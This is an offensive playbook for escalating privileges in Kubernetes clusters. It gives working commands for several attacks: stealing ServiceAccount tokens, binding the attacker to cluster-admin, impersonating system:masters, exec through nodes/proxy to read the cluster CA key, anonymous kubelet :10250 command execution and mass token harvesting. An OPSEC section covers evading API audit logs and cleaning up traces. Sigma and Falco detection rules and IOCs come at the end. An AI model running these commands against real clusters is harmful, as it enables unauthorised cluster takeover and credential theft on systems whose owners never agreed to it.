# Kubernetes RBAC Escalation & Kubelet Abuse

ATT&CK: T1078.001 (Default/Valid Accounts), T1609 (Container Administration Command), T1552.001
(Credentials in Files), T1613 (Container & Resource Discovery) · CWE-269 (Improper Privilege
Management), CWE-863 (Incorrect Authorization), CWE-306 (Missing Authentication), CWE-522 (Insufficiently
Protected Credentials).

Once you have a pod or any valid Kubernetes identity, the cluster's own authorization model is often
the fastest path to cluster-admin — frequently without any kernel/runtime escape at all.

## 0. Establish identity & enumerate

Every pod (unless opted out) mounts a ServiceAccount (SA) token:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
alias k="kubectl --token=$TOKEN --certificate-authority=$CA --server=$APISERVER -n $NS"
k auth can-i --list                                       # what THIS SA can do
```
`scripts/k8s_rbac_audit.py --dangerous` walks every (cluster)role and flags escalation primitives.

## 1. RBAC privilege-escalation primitives

| Permission held | Escalation |
|-----------------|-----------|
| `create pods` (+ a privileged/SA you can target) | Schedule a pod with `hostPath:/`, `privileged`, or mounting a more-privileged SA → escape/impersonate. |
| `pods/exec`, `pods/attach` | Exec into a pod running a more-privileged SA and steal *its* token. |
| `get/list secrets` | Read SA tokens / TLS keys cluster-wide (incl. `bootstrap-token`, cloud creds). |
| `escalate` on roles | Grant yourself permissions beyond your own (bypasses the normal escalation guard). |
| `bind` on roles / `create rolebindings` | Bind yourself (or your SA) to `cluster-admin`. |
| `impersonate` (`users`/`groups`/`serviceaccounts`) | Act as `system:masters` / another SA via `--as`. |
| `create serviceaccounts/token` (TokenRequest) | Mint tokens for higher-priv SAs. |
| wildcard `*` verbs/resources | Effectively cluster-admin. |
| `nodes/proxy` (get) | Reach the kubelet → exec in any pod on the node (see §2). |
| `update/patch` on `validatingwebhookconfigurations` | Disable admission control / install a credential-stealing webhook. |

### Concrete: bind self to cluster-admin (with `create clusterrolebindings`)
```bash
k create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount="$NS:$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null; echo default)"
# or impersonation if you hold 'impersonate':
kubectl --as=system:masters get secrets -A
```
### Concrete: steal a stronger token via exec
```bash
# find a pod whose SA has more rights, then read its mounted token:
k exec -it <priv-pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## 2. `nodes/proxy` GET → kubelet WebSocket exec RCE (2026)

**Disclosed Jan 2026 (Graham Helton); Kubernetes treats it as "working as intended" → no CVE.** A
principal with `nodes/proxy` **GET** — commonly granted to monitoring/observability SAs and assumed
read-only — can execute arbitrary commands in **any pod on the node**. Pod `exec`/`run`/`attach`/
`portforward` start as a WebSocket *HTTP GET* handshake; the kubelet authorizes on the GET verb and
performs no secondary `create` check. So `nodes/proxy` GET ⇒ exec into any pod (including privileged
`kube-system` pods) ⇒ steal tokens, read etcd, full cluster takeover.

Critically, this path **bypasses the API-server audit log and admission control entirely**, so AWS
GuardDuty/EKS, Azure Defender, and GCP native detection never see it — it is invisible to API-audit-based
tooling. Long-term fix: KEP-2862 fine-grained kubelet authorization (GA in Kubernetes v1.33); AKS applies
updated RBAC automatically on v1.33+.
```bash
# Via the API server proxy (uses your nodes/proxy GET):
k get --raw \
 "/api/v1/nodes/<node>/proxy/run/kube-system/etcd-master/etcd?cmd=cat&cmd=/etc/kubernetes/pki/ca.key"
# scripts/kubelet_exec.py drives this WebSocket exec end-to-end (API-proxy or direct kubelet).
python3 scripts/kubelet_exec.py --apiserver "$APISERVER" --token "$TOKEN" \
  --via-proxy --node node1 --pod kube-system/kube-apiserver-node1 \
  --container kube-apiserver --cmd 'cat /etc/kubernetes/pki/ca.key'
```

## 3. Direct kubelet API on :10250 (anonymous or authed)

A misconfigured kubelet with `--anonymous-auth=true` (or `authorization-mode=AlwaysAllow`) exposes RCE
on every pod on the node with **no credentials**. Even when authed, a stolen node/SA token often
suffices.
```bash
# enumerate pods, then exec — anonymous case:
curl -sk https://NODE:10250/pods | jq -r '.items[]|.metadata.namespace+"/"+.metadata.name'
curl -sk -X POST "https://NODE:10250/run/<ns>/<pod>/<container>" -d "cmd=id"
# kubeletctl automates discovery + exec + token scraping across all pods on the node:
kubeletctl --server NODE exec "id" -p <pod> -c <container> -n <ns>
kubeletctl --server NODE scan token        # harvest every pod's SA token on the node
```
The :10250 read-only/exec endpoints are reachable from any pod unless a NetworkPolicy blocks it —
restricting workload→:10250 is the key defense-in-depth control.

## Detection

**API-server audit (Sigma-style) — RBAC escalation:**
```yaml
title: Kubernetes RBAC Escalation (cluster-admin bind / escalate / impersonate)
logsource: { product: kubernetes, service: audit }
detection:
  bind:
    objectRef.resource: ['clusterrolebindings','rolebindings']
    verb: ['create','update','patch']
    requestObject.roleRef.name: 'cluster-admin'
  escalate: { verb: ['escalate','bind','impersonate'] }
  condition: bind or escalate
level: high
```
**Falco — SA token read / privileged exec:**
```yaml
- rule: Read Kubernetes Service Account Token
  condition: open_read and container and fd.name endswith "secrets/kubernetes.io/serviceaccount/token"
             and not proc.name in (pause, kubelet)
  output: "SA token read (cmd=%proc.cmdline cid=%container.id)"
  priority: WARNING
```
**For the nodes/proxy / kubelet path you cannot rely on API audit** — deploy runtime/L7 monitoring
of WebSocket upgrades and exec streams to the kubelet, and monitor the **kubelet access log** for
`/exec`,`/run`,`/attach` and direct :10250 hits from workload IPs. **IOCs:** `kubectl auth can-i`
probing bursts; new `cluster-admin` bindings; `--as=` impersonation; SA-token reads outside kubelet;
:10250 traffic from pods; `kubeletctl` user-agent.

## OPSEC

- `kubectl auth can-i`/`--list` and any `create/bind/escalate` are logged at the API server — noisy
  but normal-looking from a service account. The `nodes/proxy`→kubelet and direct :10250 paths are the
  stealthy options precisely because they skip API audit and admission.
- SA-token theft is the cleanest pivot (read-only file access); minting tokens via TokenRequest is
  quieter than creating long-lived secrets.
- Cleanup: delete any ClusterRoleBinding/pod/webhook you created (`k delete clusterrolebinding pwn`);
  remove scheduled escape pods; you cannot retract API audit entries already written. Prefer
  short-lived (TokenRequest) tokens and reuse existing privileged SAs over creating new bindings.

## References

- Graham Helton, "Kubernetes RCE via nodes/proxy GET" (Jan 2026); Aqua, "Privilege Escalation from
  Node/Proxy Rights in Kubernetes RBAC."
- Kubernetes Docs — "RBAC Good Practices" (nodes/proxy warning); KEP-2862 Fine-Grained Kubelet API Authorization.
- Microsoft AKS Security Bulletins (Container Insights / nodes/proxy mitigation, v1.33).
- `cyberark/kubeletctl`; `inguardians/peirates`; `aquasecurity/kube-hunter`.
